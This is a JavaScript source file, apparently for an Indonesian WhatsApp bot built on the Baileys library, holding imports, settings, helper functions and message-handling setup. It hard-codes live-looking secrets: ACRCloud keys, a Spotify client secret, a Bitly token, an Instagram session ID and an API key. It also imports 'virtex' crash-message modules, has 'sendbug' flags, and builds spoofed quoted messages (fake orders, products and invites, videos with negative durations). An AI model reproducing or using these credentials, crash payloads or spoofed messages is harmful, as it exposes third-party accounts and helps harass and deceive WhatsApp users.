const
{
WAConnection: _WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
WALocationMessage,
WA_MESSAGE_STUB_TYPES, 
WA_DEFAULT_EPHEMERAL,
WAMessageProto,
ProxyAgent,
ChatModification,
GroupSettingChange,
waChatKey,
mentionedJid,
processTime,
prepareMessageFromContent,
relayWAMessage
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const { igApi, getSessionId } = require('insta-fetcher');
const ig = new igApi("51710311459%3AxVxRS0bOfDTv2X%3A23")
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const PhoneNumber = require('awesome-phonenumber')
const gis = require('g-i-s');
const os = require('os')
const imageToBase64 = require('image-to-base64');
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const qrkode = require("qrcode")
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const primbon = require('primbon-scraper')
const convert = require('imagemagick')
const ytdl = require('ytdl-core');
const Download = require("@phaticusthiccy/open-apis");
const acrcloud = require("acrcloud");
const { Brainly } = require("brainly-scraper-v2");
const brainly = new Brainly("id"); 
const Jimp = require('jimp') ;
const acr = new acrcloud({
host: "identify-eu-west-1.acrcloud.com",
access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
});

const songlyrics = require('songlyrics').default
const Spotify = require('spotifydl-core').default
const spotify = new Spotify({
clientId: 'acc6302297e040aeb6e4ac1fbdfd62c3',
clientSecret: '0e8439a1280a43aba9a5bc0a16f3f009'
})
const {
youtubeSearch,
mediafiredl, 
lyricsv2, 
lyrics, 
facebookdl, 
facebookdlv2,
tiktokdl, 
tiktokdlv2, 
twitterdl, 
twitterdlv2,
getZodiac,
liputan6,
googleIt, 
wallpaperv2, 
googleImage, 
jadwalTVNow, 
gempa, 
stickerTelegram,
stickerLine,
latinToAksara,
aksaraToLatin,
asmaulhusna, asmaulhusnajson,
alquran,
jadwalsholat, listJadwalSholat,
gempaNow} = require('@bochilteam/scraper')
const { SoundCloud } = require("scdl-core");
const CuteFFMPEG = require("cute-ffmpeg").CuteFFMPEG;
const FFMPEGRequest = require("cute-ffmpeg").FFMPEGRequest;
const Ffmpeg = new CuteFFMPEG({
overwrite: true
});
const play = require('play-dl')
const { BitlyClient } = require('bitly');
const bitly = new BitlyClient('7d737131e678fc366699edead8bca146e69f6c78', {});
const Agent = require('https-proxy-agent');
const https = require('https');
const host = '87.245.209.110';
const port = '8080';
const proxy = `http://${host}:${port}`;
const agent = new Agent(proxy);



// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();



 //******************* LIB FILE ********************\\
const {FileSize, weton,week,calender,dateIslamic,formatDate, isUrl, makeid, calculate_age, generateMessageTag, runtime, randomNomor, jsonformat, generateProfilePicture, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color.js')
const hx = require("./lib/hxz-api")
const { igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { styleText, baseURI, upload, buffer2Stream, stream2Buffer, ythd} = require('./lib/ytdl')
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { hentong, sewabot, donasi, help, info1} = require('./message')
const { msgFilter, addSpam, unSpam, SpamExpired, cekSpam} = require('./lib/antispam')
const { uploadFile1Day, uptotele, uploadImages } = require('./lib/uploadimage') 
const { TelegraPh, UploadFileUgu } = require('./lib/uploader') 
const { recognize } = require('./lib/ocr')
const { servers, yta, ytv } = require('./lib/y2mate')
const textpro = require('./lib/textpro')
const simple = require("./lib/simple.js");
const WAConnection = simple.WAConnection(_WAConnection)
const client = new WAConnection()
const reminder = require("./lib/reminder");
const { buggc } = require('./lib/antibuggc.js')
const { wikiSearch } = require('./lib/wiki.js')
const _prem = require("./lib/premium");
const _sewa = require('./lib/sewa')
const game = require("./lib/game");
const { isTicTacToe, getPosTic } = require("./lib/tictactoe");
const tictac = require("./lib/tictac");
const { addAutoClear,autoClearChat,checkAutoClear, checkDataName, createDataId, getDataId, addDataId, removeDataId, checkDataId, checkClaim, getClaim, expiredClaim, addUserClaim, getHit, cmdAdd, expiredCmd } = require("./lib/totalcmd");

const { bad, menu, tekssalah, katahai, katamalem, katasiang, katasore, katalopyou, tekscmd, teksspam, ilhamberkata, ngebucin, badud, ohayo, salam, thanks, anime} = require("./message/messages.js");
const { pShadow,pRomantic,pSmoke,pBurnPapper,pNaruto,pLoveMsg,pMsgGrass,pGlitch,pDoubleHeart,pCoffeCup,pLoveText,pButterfly } = require('./lib/photooxy')
const { mediafireDl } = require('./lib/mediafire')
const translate = require('./lib/translate')

const {getDateId, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId } = require("./lib/user");
const { gethitUser, checkHit, AddHit, isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/user");



//hasil editan sendiri
const { addCommands, checkCommands, deleteCommands } = require('./lib/commands')
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword.js");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("./lib/banned")
const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");
const { addError, deleteError, checkError } = require("./lib/totalerror");
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("./lib/blockcmd");
const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, botz, unregister, ucaphai, toxicbro, spamnih, loplop } = require("./message/ninamess");




 //******************* VIRTEX FILE ********************\\
//virtex by tsukasa
const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('./virtex/virtex.js')
const { virtex6 } = require('./virtex/virtex6.js')
const { virtex7 } = require('./virtex/virtex7.js')
const { antivirus } = require('./virtex/antivirus.js')

           

 //******************* JSON FILE ********************\\
const { _scommand, commandsDB, setiker, audionye, musiknye, imagenye, videonye, bancht, senbadword, ban } = require("./message/jsonfile");
const { listcmdblock, _reminder, welkom, settings, listerror, premium, _claim, sewa, user } = require("./message/jsonfile");
const { blocked,hitnya } = require("./message/jsonfile");
const AntiSpam = JSON.parse(fs.readFileSync('./database/antispam.json'))
const DataId = JSON.parse(fs.readFileSync('./database/data.json'))

 //******************* STICKER PACK ********************\\
const { gaboleh, spam1, spam2, istigfar, hanyaadmin, jadiinadmin, ucapsalam, samasama, kumsalam } = require("./message/stickerPack.js");

 //******************* FILE PHOTO ********************\\
const virgam = fs.readFileSync('./stik/virgam.jpeg'),
 davizin = fs.readFileSync('./stik/davizinmaker.jpg'),
 girl = fs.readFileSync('./stik/trava.jpg'),
 thumb = fs.readFileSync('./stik/thumb.jpeg'),
 fakethumbnail = fs.readFileSync('./stik/fake.jpeg');











autoreadgc = false
autoreadpc = false
explain = settings.explain
global.Anticall = settings.Anticall
fake1 = settings.copyright
namalu = settings.namalu
publik = settings.publik
namaDocument = settings.namaDocument
ephemeral = false
totalForward = settings.totalForward
prefa = settings.setPrefix.prefix
multi = settings.setPrefix.multi
onepref  = settings.setPrefix.onepref
forwarding = settings.forwarding
nopref = settings.setPrefix.nopref
offline = false
autoblockcmd = settings.autoblockcmd
autobio = settings.autobio
typing= settings.typing
autoread = settings.autoread
autovn = settings.autovn
antibugtroli = settings.antitroli
targetpc = '0'
nomerOwner = settings.nomerlu
nomerbot = settings.nomerbot
fake = settings.namabot
numbernye = '0'
let tebakgambar = []; 
let family100 = []; 
let mtk = []; 
let tebaklirik = [];  
let siapaaku = [];
let tebakkata = [];
let tebakkimia = [];
let tebakbendera = [];
let tebakanime = [];
let caklontong = []
let caklontong1 = []
let nsfw = []
let siminya = []
waktu = '-'
alasan = '-'
listjadibot1 = [];
let tictactoe = [];
jeda = false
gamewaktu = settings.gamewaktu
limitCount = settings.limitCount
sendbug = false
teksChat = settings.antiPrivateChat.teksChat
chatBot = settings.antiPrivateChat.chatBot
gender = settings.gender
autosticker = settings.autosticker
autorespon = settings.autorespon 
copyright = `© ${fake1}`
Loading = settings.Loading 

autoWelcome = settings.setWelcome.autoWelcome        

AutoClearChat = settings.AutoClearChat
autoReport = true

bcTroli = true
bcLokasi = false
bcDokumen = false    

setWeb = settings.setReply.setWeb
setTroli = settings.setReply.setTroli
setMessage = settings.setReply.setMessage
setVideo = settings.setReply.setVideo


fakeToko = settings.setQuoted.fakeToko
fakeKontak = settings.setQuoted.fakeKontak
fakeTeks = settings.setQuoted.fakeTeks
fakeTroli = settings.setQuoted.fakeTroli

jumlahTroli = settings.jumlahTroli

Qoted = settings.setQuoted.Qoted
docType = "docx"
setmenu = settings.setMenu.setmenu

const On =`ᴏɴ`
const Off =`ᴏғғ`
Myprofile = `ᴍʏ ᴘʀᴏғɪʟᴇ`
Mainlagi = `ᴍᴀɪɴ ʟᴀɢɪ`
const extream = ["6285156137901-1632578387@g.us","6285156137901-1633160194@g.us"]
badword = ["ngentot","Vcs","ngntod","Ngentot","Ngentod","ajg","Anjing","anjing","Bajingan","bajingan","Anj","vcs","Babi","babi","Bacot","bacot","Bcot","bcot","anj","tolol","Jancok","bgo","Bego","Tolol","Kontol","kontol","Kntl","kntl","KONTOL","sange","Sange","Lonte","lonte","Lnte","lnte","Memek","memek","Mmek","mmek","Peler","pler","Silet","peler","silit","Silet","Tai","tai","Taek","taek","coeg"]
zenzkey = "officialdittaz"


autoLevel = settings.autoLevel    

const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}

const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}





   


/*           Recodenya yang teliti ya sayang                                                                              */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Ownerin ="6285156137901@s.whatsapp.net"
/*           ntar klo error jangan salahin gua                                                               */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ownerNumber = [`6285156137901@s.whatsapp.net`,`${nomerOwner}@s.whatsapp.net`,`${nomerbot}@s.whatsapp.net`]
//=================================================//
module.exports = xdev = async (xdev, dev, baterai) => {
	try {
        if (!dev.hasNewMessage) return 
        dev = dev.messages.all()[0]
		if (!dev.message) return                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
		if (dev.key && dev.key.remoteJid == 'status@broadcast') return
		const m = simple.smsg(xdev, dev);
		const senderr = m.sender.split`@`[0]
		const cot = dev.key.fromMe ? xdev.user.jid : xdev.contacts[dev.key.fromMe ? xdev.user.jid : dev.key.remoteJid.endsWith('@g.us') ? dev.participant : dev.key.remoteJid] || { notify: jid.replace(/@.+/, '') }
        const pushnem = dev.key.fromMe ? xdev.user.name : cot.notify || cot.vname || cot.name || '-'
        const sent = dev.key.fromMe ? xdev.user.jid : dev.key.remoteJid.endsWith('@g.us') ? dev.participant : dev.key.remoteJid
		const theOwner = Ownerin.includes(sent)
		const isowner = ownerNumber.includes(sent)
		const metaData = dev.key.remoteJid.endsWith('@g.us')  ? await xdev.groupMetadata(dev.key.remoteJid) : ''
		const memberGroup = dev.key.remoteJid.endsWith('@g.us')  ? metaData.participants : ''
		const botAdmins = dev.key.remoteJid.endsWith('@g.us') ? getGroupAdmins(memberGroup) : ''
		const adminGroup = botAdmins.includes(sent) || false
		const isBotAdmins = botAdmins.includes(xdev.user.jid) || false
		const Antibuggc = checkDataId ("antibuggc", dev.key.remoteJid, DataId) 
		
	     //Antibuggc edited  by official dittaz, thanks to Mbb, Memans and Manik
	    if(Antibuggc && dev.key.remoteJid.endsWith('@g.us')){
	    if(Object.keys(dev.message)[0] === 'ephemeralMessage' && JSON.stringify(dev.message).includes('EPHEMERAL_SETTING') && dev.message.ephemeralMessage.message.protocolMessage.type === 3){ 
		if(adminGroup) return xdev.sendMessage(dev.key.remoteJid, 'Admin grup mah bebas main buggc yekan 😎🤣', MessageType.text)
	    if(isowner) return xdev.sendMessage(dev.key.remoteJid, 'Owner mah bebas ngebug yekan 😎🤣', MessageType.text)
        xdev.sendMessage(dev.key.remoteJid, buggc(senderr,pushnem), MessageType.text)
        if(!isBotAdmins) return 
        await xdev.groupRemove(dev.key.remoteJid, [sent]);
		}
		}
		   
        dev.message = (Object.keys(dev.message)[0] === 'ephemeralMessage') ? dev.message.ephemeralMessage.message : dev.message        
        me = xdev.user
        const antibot = m.isBaileys
        const content = JSON.stringify(dev.message)
		const from = dev.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const type = Object.keys(dev.message)[0]        
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		//const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        var pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
        const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const messagesC = pes.slice(0).trim()
       
        if (multi){
		var prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
        if (nopref){
         prefix = ''
         } else {
         prefix = prefa
         }
         }  
        global.prefix
        const body = (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'videoMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'extendedTextMessage') && dev.message[type].text.startsWith(prefix) ? dev.message[type].text : (type == 'listResponseMessage') && dev.message[type].singleSelectReply.selectedRowId ? dev.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && dev.message[type].selectedButtonId ? dev.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(dev.message[type].fileSha256.toString('base64')) !== null && getCmd(dev.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message[type].fileSha256.toString('base64')) : ""
        //body = (type === 'listResponseMessage' && dev.message.listResponseMessage.title) ? dev.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && dev.message.buttonsResponseMessage.selectedButtonId) ? dev.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption.startsWith(prefix) ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption.startsWith(prefix) ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text.startsWith(prefix) ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        button = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedDisplayText : ''
        listmes = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
		//const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
        const c = args.join(" ")
		const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
		const botNumber = xdev.user.jid
		const botNumberss = xdev.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = dev.key.fromMe ? xdev.user.jid : isGroup ? dev.participant : dev.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const isOwner = ownerNumber.includes(sender)
		const totalchat = await xdev.chats.all()
		const groupMetadata = isGroup ? await xdev.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const conts = dev.key.fromMe ? xdev.user.jid : xdev.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = dev.key.fromMe ? xdev.user.name : conts.notify || conts.vname || conts.name || '-'
        chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        const forward = { forwardingScore: totalForward, isForwarded: forwarding, sendEphemeral: ephemeral}
        
       
        
        const isBanned = cekBannedUser(sender, ban)
        const isHit = checkHit(senderNumber, user)
        
        const timestampp = speed();
	    const latensi = speed() - timestampp
        const arg = budy.slice(command.length + 2, budy.length)
        const atibot = dev.isBaileys
        const gcounti = settings.gcount
        const itsMe = dev.key.fromMe
        const mentionByTag = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.participant || "" : ""
 
 
 
   //User 
  const userLevel = getLevelingLevel(senderNumber, user)
  const userExp = getLevelingXp(senderNumber, user)
  const userId = getLevelingId(senderNumber, user)
  const amountExp = Math.floor(Math.random() * 10) + 50
  const requiredExp = 1000 * userLevel
  const userPersen = userExp/requiredExp*100
  const userVerified = getDateId(senderNumber, user)
   
//VN saat ada yg maggil bot
const iyakak = botz[Math.floor(Math.random() * botz.length)]              
const ucapbot = fs.readFileSync(iyakak)

//Vn saat command tidak ditemukan
const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
const gakada = fs.readFileSync(unreg)

//VN saat ada yang toxic
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
const astaga = fs.readFileSync(anying)

//VN saat ada yg akses fitur owner
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
const gakmau = fs.readFileSync(ahenggak)

//VN saat ada yg bilang selamat pagi
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)

//VN saat ada yg bilang selamat malam
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)

//VN saat ada yg bilang selamat siang
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)

//VN saat ada yg spam
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)

//VN saat ada yg bilang halo
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)

//VN saat ada yg bilang asalamualaikum
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

//VN saat ada yg bilang i love u
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu)

//Random nama anime
const karakter = anime[Math.floor(Math.random() * anime.length)]

//Teks untuk pertanyaan game yg salah
const jawabansalah = tekssalah[Math.floor(Math.random() * tekssalah.length)]
           
const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]                         
const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]                         

 
//Security / Keamanan
const Toxic = checkDataId ("antibadword", from, DataId) 
const isBanchat = checkDataId ("banchat", from, DataId) 
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isVote = isGroup ? voting.includes(from) : false
const isAntiLink = checkDataId ("antilink", from, DataId) 
const AntiVirtex = checkDataId ("antivirtex", from, DataId) 
const isAntilinkGc = checkDataId ("antilinkgc", from, DataId) 
const isAntihidetag = checkDataId ("antihidetag", from, DataId) 
const isAntiviewonce = checkDataId ("antivo", from, DataId) 
const isKickarea = checkDataId ("antiasing", from, DataId) 
const isWelkom = isGroup ? JSON.parse(fs.readFileSync('./database/welkom.json')).includes(from) : false
const isExtream = isGroup ? extream.includes(from) : false
const isSimi = isGroup ? siminya.includes(from) : false
const isAntidel = isGroup ? xdev.antidel.includes(from) : false
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user






//Auto READ   
if(autoread){
 xdev.chatRead(from, "read").catch(() => { })
 }

// Auto Read Group 
if(autoreadgc){
var readgc =  xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
readgc.map( async ({ jid }) => {
 xdev.chatRead(jid, "read")
})
}

// Auto Read Private 
if(autoreadpc){
var readpc =  xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
readpc.map( async ({ jid }) => {
 xdev.chatRead(jid, "read")
})
}


 //******************* 》MESSGAGE RESPON《 ********************\\
mess = {
wait: '⏳ Loading...!!',
search: '⏳ Searching...',
admin: 'Kusus admin',
owner: 'Khusus owner',
success: 'Berhasil!',
limit: `[❕] Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`,
eror: 'Eror To Again',
claimOnAlready: `Kamu sudah melakukan claim sebelumnya, Harap claim lagi pada jam ${getClaim(senderNumber, _claim)}.`,
wrongFormat: 'Format salah, coba liat lagi di menu',
error: {
stick: 'bukan sticker itu:v',
api: 'Error api atau linkya mungkin',
Iv: 'Linknya error:v'
},
only: {
prem : 'Premium special features! Chat owner to get Premium access!',
group: 'Fitur Dapat digunakan di Dalam Group!',
ownerG: 'Fitur Dapat digunakan oleh Owner Group!',
ownerB: 'Fitur Khusus Owner Bot!',
admin: 'Fitur dapat Digunakan oleh Admin Group!',
Badmin: 'Fitur dapat Digunakan Setelah Bot menjadi ADMIN!'
 }
 }
            

//Ucapan Waktu  
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat 🌃 Malam' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat 🌃 Malam'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat 🌅 Sore'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat 🌄 Siang'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat 🏙 Pagi'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat 🏙 Pagi'  }      
        
//FAKE REPLY  
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/fake.jpeg`)},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${getBalance(senderNumber, user)}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : jumlahTroli, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: `0@s.whatsapp.net`}}}
const fsticker = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
const fvn = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
const fvideo = { key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const fgc = { key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const fgif = { key: {fromMe: false,participant: `6285842369183@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}} 
